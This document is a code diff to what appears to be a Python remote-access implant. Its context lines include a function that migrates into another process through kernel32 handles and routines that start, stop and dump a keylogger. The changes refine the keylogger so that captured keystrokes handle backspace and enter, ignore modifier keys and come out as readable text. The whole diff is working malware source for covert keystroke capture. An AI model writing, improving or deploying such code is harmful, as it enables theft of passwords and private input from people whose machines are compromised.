@@ -200,10 +200,19 @@ def migrate_to_process(target_pid):
 
     # Close the target process handle
     kernel32.CloseHandle(target_handle)
-
+    
 def keylogger_callback(event):
     global keylogger_data
-    keylogger_data.append(event.name)
+    # Special keys processing
+    if event.name == 'backspace':
+        if keylogger_data:
+            keylogger_data = keylogger_data[:-1]  # Remove the last character
+    elif event.name == 'enter':
+        keylogger_data.append('\n')  # Add a new line for 'enter'
+    elif event.name == 'shift' or event.name == 'ctrl' or event.name == 'alt':
+        pass  # Ignore shift, ctrl, and alt keys
+    else:
+        keylogger_data.append(event.name)  # Append regular keys
 
 def start_keylogger():
     global keylogger_running
@@ -219,9 +228,11 @@ def stop_keylogger():
         keylogger_running = False
         print("Keylogger stopped.")
 
+
 def dump_keylogger_data():
     global keylogger_data
-    data = '\n'.join(keylogger_data)
+    # Join all captured characters into a single string, ensuring no unnecessary line breaks
+    data = ''.join(keylogger_data)
     keylogger_data = []  # Clear the data after dumping
     return data
 
